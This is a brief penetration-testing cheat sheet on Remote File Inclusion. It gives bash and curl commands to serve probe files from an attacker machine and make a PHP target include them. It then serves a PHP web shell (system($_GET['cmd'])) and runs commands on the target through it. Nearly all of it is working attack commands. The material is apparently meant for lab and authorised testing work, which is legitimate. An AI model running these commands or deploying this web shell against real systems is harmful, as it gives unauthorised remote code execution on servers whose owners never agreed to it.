# RFI

Related: [lfi.md](lfi.md) · [ssrf.md](ssrf.md)

## Serve two probes
```bash
RFI_DIR=$(mktemp -d)
printf 'RFI_FETCH_42\n' > "$RFI_DIR/probe.txt"
printf '%s\n' "<?php echo 'RFI_EXEC_42'; ?>" > "$RFI_DIR/probe-php.txt"
python3 -m http.server 8000 --bind 0.0.0.0 --directory "$RFI_DIR"
```
```bash
curl -sS -G 'http://<IP>/index.php' --data-urlencode 'page=http://<KALI>:8000/probe.txt'
curl -sS -G 'http://<IP>/index.php' --data-urlencode 'page=http://<KALI>:8000/probe-php.txt'
```

| Result | Means |
| --- | --- |
| GET in your server log | Target fetched it (could be SSRF / remote read) |
| `RFI_FETCH_42` in response | Remote text returned |
| `RFI_EXEC_42`, no PHP source | Remote PHP interpreted |

## Command execution
```bash
printf '%s\n' '<?php system($_GET["cmd"]); ?>' > "$RFI_DIR/cmd.php"
curl -sS -G 'http://<IP>/index.php' \
  --data-urlencode 'page=http://<KALI>:8000/cmd.php' \
  --data-urlencode 'cmd=id'
```
- No GET → route to `<KALI>:8000`, app-added prefix/extension.
- Remote `include` needs `allow_url_include` (off by default); reads need `allow_url_fopen`.
